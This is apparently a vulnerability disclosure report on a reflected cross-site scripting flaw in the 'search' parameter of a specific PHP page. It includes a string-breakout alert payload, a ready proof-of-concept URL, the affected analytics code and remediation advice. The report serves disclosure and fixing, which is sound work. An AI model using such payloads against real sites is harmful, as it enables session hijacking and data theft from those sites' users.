## Title

Reflected Cross-Site Scripting (XSS) via `search` Parameter


## Vulnerability Type

Reflected XSS


## Summary

The `search` parameter is reflected inside a JavaScript context without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

The issue occurs inside the analytics tracking script:

```javascript
internalSearchTerm: ""+alert("xicorr55.php")+"",
```


## Vulnerable Endpoint

```http
https://kzlabs.com/55.php
```

### Vulnerable Parameter

```http
search
```


## Steps to Reproduce

1. Open the following URL:

```http
https://kzlabs.com/55.php?search=%22%2Balert(%22xicorr55.php%22)%2B%22
```

2. Observe that a JavaScript alert executes on page load.


## Payload Used

```javascript
"+alert("xicorr55.php")+"
```


## Proof of Concept

The payload is reflected directly into the following JavaScript code:

```javascript
window.onload = function(e) {
    Analytics.trackEvent('searchReturned', {
        internalSearchTerm: ""+alert("xicorr55.php")+"",
        numOfSearchResultsReturned: 5
    });
}
```

### Screenshot — Alert Popup Triggered

![Alert Popup](./xss-screenshots/55-alert-popup.png)


## Impact

An attacker can exploit this vulnerability to:

- Hijack authenticated user sessions
- Potentially achieve account takeover
- Perform unauthorized actions within the application
- Exfiltrate sensitive user data
- Execute arbitrary JavaScript in the victim’s browser context


## Recommendations for Fix

- Properly sanitize and encode all user-controlled input before rendering it inside JavaScript contexts
- Avoid directly embedding user input inside `<script>` blocks
- Use safe serialization methods such as `JSON.stringify()`
- Apply contextual output encoding (e.g., `htmlspecialchars()` in PHP where appropriate)
- Implement a strict Content Security Policy (CSP) to reduce XSS impact
